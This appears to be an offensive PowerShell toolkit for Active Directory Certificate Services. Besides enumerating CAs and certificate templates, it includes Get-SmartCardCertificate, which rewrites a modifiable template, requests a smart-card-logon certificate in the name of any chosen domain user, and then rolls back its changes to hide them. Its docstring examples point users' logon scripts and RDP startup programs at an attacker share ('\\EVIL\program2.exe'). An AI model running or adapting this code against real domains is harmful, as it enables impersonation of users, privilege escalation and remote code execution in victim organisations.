function Get-RootCA{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain
    )

if($Domain)
{
    $DomainName = "DC=" + $Domain.Replace(".",",DC=")
}
else
{
    $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
}

$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
$RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter "(objectclass=certificationAuthority)"

$RootCA

}

function Get-EnterpriseCA{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain
    )

if($Domain)
{
    $DomainName = "DC=" + $Domain.Replace(".",",DC=")
}
else
{
    $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
}

$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
$IntegratedCA = Get-DomainObject -SearchBase ("CN=Enrollment Services," + $BasePath) -LDAPFilter "(objectclass=pKIEnrollmentService)"

$IntegratedCA

}

function Convert-ADCSNameFlag{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 1, Mandatory = $true, ValueFromPipeline=$true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Flag
    )

# Based on 2.28 msPKI-Certificate-Name-Flag Attribute
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1

$Result = @()

$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')

if($BitFlag.Substring(31,1) -eq '1')
{
    $Result += "ENROLLEE_SUPPLIES_SUBJECT"
}

if($BitFlag.Substring(28,1) -eq '1')
{
    $Result += "OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME"
}

if($BitFlag.Substring(15,1) -eq '1')
{
    $Result += "ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME"
}

if($BitFlag.Substring(9,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DOMAIN_DNS"
}

if($BitFlag.Substring(7,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DIRECTORY_GUID"
}

if($BitFlag.Substring(6,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_UPN"
}

if($BitFlag.Substring(5,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_EMAIL"
}

if($BitFlag.Substring(4,1) -eq '1')
{
    $Result += "SUBJECT_ALT_REQUIRE_DNS"
}

if($BitFlag.Substring(3,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_DNS_AS_CN"
}

if($BitFlag.Substring(2,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_EMAIL"
}

if($BitFlag.Substring(1,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_COMMON_NAME"
}

if($BitFlag.Substring(0,1) -eq '1')
{
    $Result += "SUBJECT_REQUIRE_DIRECTORY_PATH"
}

$Result

}

function Convert-ADCSEnrollmentFlag{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 1, Mandatory = $true, ValueFromPipeline=$true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Flag
    )

# Based on 2.26 msPKI-Enrollment-Flag Attribute
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1

$Result = @()

$BitFlag =  [convert]::ToString($Flag,2).padleft(32,'0')

if($BitFlag.Substring(31,1) -eq '1')
{
    $Result += "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
}

if($BitFlag.Substring(30,1) -eq '1')
{
    $Result += "CT_FLAG_PEND_ALL_REQUESTS"
}

if($BitFlag.Substring(29,1) -eq '1')
{
    $Result += "CT_FLAG_PUBLISH_TO_KRA_CONTAINER"
}

if($BitFlag.Substring(28,1) -eq '1')
{
    $Result += "CT_FLAG_PUBLISH_TO_DS"
}

if($BitFlag.Substring(27,1) -eq '1')
{
    $Result += "CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE"
}

if($BitFlag.Substring(26,1) -eq '1')
{
    $Result += "CT_FLAG_AUTO_ENROLLMENT"
}
if($BitFlag.Substring(25,1) -eq '1')
{
    $Result += "CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT"
}

if($BitFlag.Substring(23,1) -eq '1')
{
    $Result += "CT_FLAG_USER_INTERACTION_REQUIRED"
}

if($BitFlag.Substring(21,1) -eq '1')
{
    $Result += "CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE"
}

if($BitFlag.Substring(20,1) -eq '1')
{
    $Result += "CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF"
}

if($BitFlag.Substring(19,1) -eq '1')
{
    $Result += "CT_FLAG_ADD_OCSP_NOCHECK"
}

if($BitFlag.Substring(18,1) -eq '1')
{
    $Result += "CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL"
}

if($BitFlag.Substring(17,1) -eq '1')
{
    $Result += "CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS"
}

if($BitFlag.Substring(16,1) -eq '1')
{
    $Result += "CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS"
}

if($BitFlag.Substring(15,1) -eq '1')
{
    $Result += "CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT"
}

if($BitFlag.Substring(14,1) -eq '1')
{
    $Result += "CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST"
}

$Result

}


function Convert-ADCSFlag{

        [CmdletBinding()]
        Param (
        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateSet("mspki-enrollment-flag","mspki-certificate-name-flag")]
        [string]
        $Attribute,

        [Parameter(Position = 2, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [string]
        $Value)

switch($Attribute)
{
    "mspki-enrollment-flag" { Convert-ADCSEnrollmentFlag -Flag $Value }
    "mspki-certificate-name-flag"{ Convert-ADCSNameFlag -Flag $Value }
}


}


function Get-ADCSTemplateACL {

        [CmdletBinding()]
        Param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,
        
        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain,
        
        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $FilterAdmins,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $FilterDefault)
        

if(-Not $Domain)
{
    $Domain = (Get-Domain).Name
}
$DomainName = "DC=" + $Domain.Replace(".",",DC=")
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

$SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
$SearcherArguments.Add("LDAPFilter","(objectclass=pKICertificateTemplate)")
if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") }

$TemplatesACL = Get-DomainObjectACL @SearcherArguments -Resolveguids
#$TemplatesACL = Get-DomainObjectACL -ResolveGuids -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter "(objectclass=pKICertificateTemplate)"

foreach($acl in $TemplatesACL)
{
    $acl | Add-Member -MemberType NoteProperty -Name Identity -Value (Convert-SidToName $acl.SecurityIdentifier)
}

if ($PSBoundParameters['FilterAdmins']) { $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9")) } }

if ($PSBoundParameters['FilterDefault']) { $TemplatesACL = $TemplatesACL | ? { -not (($_.SecurityIdentifier.value -like "*-512") -or ($_.SecurityIdentifier.value -like "*-519") -or ($_.SecurityIdentifier.value -like "*-516") -or ($_.SecurityIdentifier.value -like "*-500") -or ($_.SecurityIdentifier.value -like "*-498") -or ($_.SecurityIdentifier.value -eq "S-1-5-9") -or ($_.SecurityIdentifier.value -eq "S-1-5-11") -or ($_.SecurityIdentifier.value -like "*-513") -or ($_.SecurityIdentifier.value -like "*-515") -or ($_.SecurityIdentifier.value -like "*-553")) } }

$TemplatesACL

}

function Get-ADCSTemplate{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $ResolveFlags,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $IncludeACL,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $Raw
    )

if(-Not $Domain)
{
    $Domain = (Get-Domain).Name
}
$DomainName = "DC=" + $Domain.Replace(".",",DC=")
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

$SearcherArguments = @{"SearchBase"=("CN=Certificate Templates," + $BasePath)}
$SearcherArguments.Add("LDAPFilter","(objectclass=pKICertificateTemplate)")
if ($PSBoundParameters['Name']) { $SearcherArguments['LDAPFilter'] = ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") }
if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }

$Templates = Get-DomainObject @SearcherArguments


if($IncludeACL)
{
    $TemplatesACL = Get-ADCSTemplateACL

    foreach($t in $Templates)
    {
        $ACEs = $TemplatesACL | ? {$_.ObjectDN -eq $t.distinguishedname}
        $t | Add-Member -MemberType NoteProperty -Name "ACL" -Value $ACEs
    }
}

if($ResolveFlags)
{

    foreach($t in $Templates)
    {
        $CertificateNameFlag = Convert-ADCSFlag -Attribute mspki-certificate-name-flag -Value $t.'mspki-certificate-name-flag'
        if($CertificateNameFlag)
        {
            $t | Add-Member -MemberType NoteProperty -Name "CertificateNameFlag" -Value $CertificateNameFlag
        }

        $EnrollmentFlag = Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value $t."mspki-enrollment-flag"
        if($EnrollmentFlag)
        {
            $t | Add-Member -MemberType NoteProperty -Name "EnrollmentFlag" -Value $EnrollmentFlag
        }
    }

}

$Templates

}

function Get-DomainCertificate
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Hashtable]
        $Param)

    $SubjectDN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
    $SubjectDN.Encode("CN=Chuck Norris,OU=Users,OU=MAIN,DC=corp,DC=contoso,DC=com", [System.Security.Cryptography.X509Certificates.X500DistinguishedNameFlags](0))

    $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
    $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
    $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
    $IAN.InitializeFromString(0xB,"norris@corp.contoso.com")
    $IANs.Add($IAN)
    $SAN.InitializeEncode($IANs)

    $csps = New-Object -ComObject X509Enrollment.CCSPInformations
    $csps.AddAvailableCsps()

    $pk = New-Object -ComObject X509Enrollment.CX509PrivateKey
    $pk.ContainerName = "Hugo"
    $pk.ProviderName = "Microsoft Base Smart Card Crypto Provider"
    $pk.ProviderType = X509ProviderType.XCN_PROV_RSA_FULL
    $pk.Length = 2048;
    $pk.KeySpec = "X509KeySpec.XCN_AT_KEYEXCHANGE"

    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromTemplateName(0x1,"Test101")
    $Request.Request.X509Extensions.Add($SAN)
    $Request.Enroll()
}

function Set-ADCSTemplate
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [Hashtable]
        $Properties,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $Force

        )

if(-Not $Domain)
{
    $Domain = (Get-Domain).Name
}      
$DomainName = "DC=" + $Domain.Replace(".",",DC=")
$BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName

if($Global:ADCSTEMPLATESETTINGS -and -not $Force)
{
    Write-Warning "Global state variable exists. If you go on, you may loose old data. Use -Force to override"
}
else {
        $Global:ADCSTEMPLATESETTINGS = @{}
        $template = Get-ADCSTemplate -Name $Name -Raw
        $entry = $template.GetDirectoryEntry()
        $Properties.GetEnumerator() | ForEach-Object {
            try{
                $value = $entry.Get($_.Key)
                if($value.gettype().Name -eq "Int32")
                {
                    $value = $value.ToString()
                }
            }
            catch
            {
                $value = "CLEAR"
            }
            $Global:ADCSTEMPLATESETTINGS.Add($_.Key,$value)
        }
        foreach($p in $Properties.GetEnumerator())
        {
            if($p.Value.contains(";"))
            {
                Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value} -MultiStringValue
            }
            else {
                if($p.Value -eq "CLEAR")
                {
                    Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Clear $p.Key
                }
                else 
                {
                    Set-CFDomainObject -SearchBase ("CN=Certificate Templates," + $BasePath) -LDAPFilter ("(objectclass=pKICertificateTemplate)(name=" + $Name + ")") -Set @{$p.Key=$p.Value}
                }
            }

        }
    }

}

function Reset-ADCSTemplate
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Name)

        if(-not $Global:ADCSTEMPLATESETTINGS)
        {
            Write-Warning "No state variable found. Nothing to reset."
        }
        else
        {
            Set-ADCSTemplate -Name $Name -Properties $Global:ADCSTEMPLATESETTINGS -Force
            $Global:ADCSTEMPLATESETTINGS = ""
        }
}
function Get-SmartCardCertificate{

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Identity,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $TemplateName,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullorEmpty()]
        [Switch]
        $NoSmartcard)



$STOPERROR = $false

$user = Get-DomainObject -Identity $Identity

if(-not $user)
{
    Write-Warning "User $($Identity) does not exist."
    $STOPERROR = $true
}
if(-not (Get-ADCSTemplate -Name $TemplateName))
{
    Write-Warning "Template $($TemplateName) does not exist."
    $STOPERROR = $true
}

if(-not $STOPERROR)
{

    $TargetCN = $user.distinguishedname
    $TargetUPN = $user.userprincipalname

    $Properties = @{}
    $Properties.Add('mspki-certificate-name-flag','1')
    $Properties.Add('pkiextendedkeyusage','1.3.6.1.4.1.311.20.2.2;1.3.6.1.5.5.7.3.2')
    $Properties.Add('msPKI-Certificate-Application-Policy','1.3.6.1.4.1.311.20.2.2;1.3.6.1.5.5.7.3.2')

    if($PSBoundParameters['NoSmartcard'])
    {
        $Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')
    }
    else
    {
        $Properties.Add('pKIDefaultCSPs','1,Microsoft Base Smart Card Crypto Provider')
    }

    $Properties.Add('flags','CLEAR')

    Write-Output "Changing template $TemplateName to enroll smartcard certificates"
    Set-ADCSTemplate -Name $TemplateName -Properties $Properties -Force

    Write-Output "Requesting Certificate"
    $SubjectDN = New-Object -ComObject X509Enrollment.CX500DistinguishedName
    $SubjectDN.Encode($TargetCN)
    #$SubjectDN.Encode($TargetCN, [System.Security.Cryptography.X509Certificates.X500DistinguishedNameFlags](0))

    $SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
    $IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
     $IAN = New-Object -ComObject X509Enrollment.CAlternativeName
    $IAN.InitializeFromString(0xB,$TargetUPN)
    $IANs.Add($IAN)
    $SAN.InitializeEncode($IANs)
    $Request = New-Object -ComObject X509Enrollment.CX509Enrollment
    $Request.InitializeFromTemplateName(0x1,$TemplateName)
    $Request.Request.X509Extensions.Add($SAN)
    $Request.Enroll()

    Write-Output "Rolling back changes"
    Reset-ADCSTemplate -Name $TemplateName

}

}

function New-VirtualSmartCard
{
    
Write-Warning "Automatic generation of virtual smart cards is for testing only."

$VSCName = "VSC" + (get-random -Minimum 1000 -Maximum 9999).ToString()
$VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generate"

    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = "tpmvscmgr.exe"
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = $VSCArgs
    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $pinfo
    $p.Start() | Out-Null
    $p.WaitForExit()
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()

    if($stderr)
    {
        Write-Warning "An error occurred during VSC generation."
        Write-Verbose $stderr
    }
    else {
        Write-Output "Virtual smartcard $($VSCName) created"
    }
}

#Quick and dirty modifcation of Will Schroeders Set-DomainObject to implement multistring values
function Set-CFDomainObject {
    <#
    .SYNOPSIS
    
    Modifies a gven property for a specified active directory object.
    
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Get-DomainObject  
    
    .DESCRIPTION
    
    Splats user/object targeting parameters to Get-DomainObject, returning the raw
    searchresult object. Retrieves the raw directoryentry for the object, and sets
    any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
    from -Clear @().
    
    .PARAMETER Identity
    
    A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
    SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
    Wildcards accepted.
    
    .PARAMETER Set
    
    Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.
    
    .PARAMETER XOR
    
    Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.
    
    .PARAMETER Clear
    
    Specifies an array of object properties that will be cleared in the directory.
    
    .PARAMETER Domain
    
    Specifies the domain to use for the query, defaults to the current domain.
    
    .PARAMETER LDAPFilter
    
    Specifies an LDAP query string that is used to filter Active Directory objects.
    
    .PARAMETER SearchBase
    
    The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
    Useful for OU queries.
    
    .PARAMETER Server
    
    Specifies an Active Directory server (domain controller) to bind to.
    
    .PARAMETER SearchScope
    
    Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
    
    .PARAMETER ResultPageSize
    
    Specifies the PageSize to set for the LDAP searcher object.
    
    .PARAMETER ServerTimeLimit
    
    Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
    
    .PARAMETER Tombstone
    
    Switch. Specifies that the searcher should also return deleted/tombstoned objects.
    
    .PARAMETER MultiStringValue
    
    Indicates that the property you want to set via "-Set" contains a multi string value. Separate the values with a semicolon like this: -Set @{"Key" = "Value1;Value2"}
    
    .PARAMETER Credential
    
    A [Management.Automation.PSCredential] object of alternate credentials
    for connection to the target domain.
    
    .EXAMPLE
    
    Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
    
    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
    VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser
    
    .EXAMPLE
    
    "S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose
    
    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
    VERBOSE: Get-DomainObject filter string:
    (&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
    VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
    VERBOSE: Setting countrycode to 1234 for object harmj0y
    VERBOSE: Get-DomainSearcher search string:
    LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
    VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
    VERBOSE: Setting countrycode to 1234 for object testuser
    
    .EXAMPLE
    
    "S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose
    
    Cleares the 'department' field for both object identities.
    
    .EXAMPLE
    
    Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
    
    Name                           Value
    ----                           -----
    NORMAL_ACCOUNT                 512
    
    
    Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose
    
    VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
    VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
    VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'
    
    Get-DomainUser testuser | ConvertFrom-UACValue -Verbose
    
    Name                           Value
    ----                           -----
    NORMAL_ACCOUNT                 512
    DONT_EXPIRE_PASSWORD           65536
    
    .EXAMPLE
    
    Get-DomainUser -Identity testuser -Properties scriptpath
    
    scriptpath
    ----------
    \\primary\sysvol\blah.ps1
    
    $SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
    Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
    VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
    VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
    VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
    VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
    VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
    VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'
    
    Get-DomainUser -Identity testuser -Properties scriptpath
    
    scriptpath
    ----------
    \\EVIL\program2.exe
    #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $False, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
            [Alias('DistinguishedName', 'SamAccountName', 'Name')]
            [String[]]
            $Identity,
    
            [ValidateNotNullOrEmpty()]
            [Alias('Replace')]
            [Hashtable]
            $Set,
    
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $XOR,
    
            [ValidateNotNullOrEmpty()]
            [String[]]
            $Clear,
    
            [ValidateNotNullOrEmpty()]
            [String]
            $Domain,
    
            [ValidateNotNullOrEmpty()]
            [Alias('Filter')]
            [String]
            $LDAPFilter,
    
            [ValidateNotNullOrEmpty()]
            [Alias('ADSPath')]
            [String]
            $SearchBase,
    
            [ValidateNotNullOrEmpty()]
            [Alias('DomainController')]
            [String]
            $Server,
    
            [ValidateSet('Base', 'OneLevel', 'Subtree')]
            [String]
            $SearchScope = 'Subtree',
    
            [ValidateRange(1, 10000)]
            [Int]
            $ResultPageSize = 200,
    
            [ValidateRange(1, 10000)]
            [Int]
            $ServerTimeLimit,
            
            [Switch]
            $Tombstone,
    
            [Switch]
            $MultiStringValue,
    
            [Management.Automation.PSCredential]
            [Management.Automation.CredentialAttribute()]
            $Credential = [Management.Automation.PSCredential]::Empty
        )
    
        BEGIN {
            $SearcherArguments = @{'Raw' = $True}
            if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
            if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
            if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        }
    
        PROCESS {
            if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
    
            # splat the appropriate arguments to Get-DomainObject
            $RawObject = Get-DomainObject @SearcherArguments
    
            ForEach ($Object in $RawObject) {
    
                $Entry = $RawObject.GetDirectoryEntry()
    
                if($PSBoundParameters['Set']) {
                    try {
                        $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                            if($PSBoundParameters['MultiStringValue']) 
                            {
                                $_.Value = $_.Value.Split(";").Trim()
                            }
                            Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                            $Entry.put($_.Name, $_.Value)
                        }
                        $Entry.commitchanges()
                    }
                    catch {
                        Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                    }
                }
                if($PSBoundParameters['XOR']) {
                    try {
                        $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                            $PropertyName = $_.Name
                            $PropertyXorValue = $_.Value
                            Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                            $TypeName = $Entry.$PropertyName[0].GetType().name
    
                            # UAC value references- https://support.microsoft.com/en-us/kb/305144
                            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                            $Entry.$PropertyName = $PropertyValue -as $TypeName
                        }
                        $Entry.commitchanges()
                    }
                    catch {
                        Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                    }
                }
                if($PSBoundParameters['Clear']) {
                    try {
                        $PSBoundParameters['Clear'] | ForEach-Object {
                            $PropertyName = $_
                            Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                            $Entry.$PropertyName.clear()
                        }
                        $Entry.commitchanges()
                    }
                    catch {
                        Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                    }
                }
            }
        }
    }
    